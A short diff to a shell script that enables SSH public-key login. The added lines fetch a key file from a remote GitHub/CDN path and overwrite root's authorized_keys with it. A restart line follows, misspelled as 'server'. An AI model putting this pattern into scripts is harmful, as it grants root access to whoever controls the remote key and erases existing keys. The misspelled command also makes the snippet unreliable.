@@ -7,4 +7,10 @@
 [ -f /etc/ssh/sshd_config ] && sed -i "s/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/g" /etc/ssh/sshd_config;
 [ -f /etc/ssh/sshd_config ] && sed -i "s/^#\?AuthorizedKeysFile.*/AuthorizedKeysFile \.ssh\/authorized_keys \.ssh\/authorized_keys2/g" /etc/ssh/sshd_config;
 
+[ -d /root/.ssh/ ] && curl https://cdn.jsdelivr.net/gh/ixmu/Note/ssh/PubkeyAuthentication > /root/.ssh/authorized_keys
+[ ! -d /root/.ssh/ ] && mkdir /root/.ssh/ && curl https://cdn.jsdelivr.net/gh/ixmu/Note/ssh/PubkeyAuthentication > /root/.ssh/authorized_keys
+
+server ssh restart
+
+
 
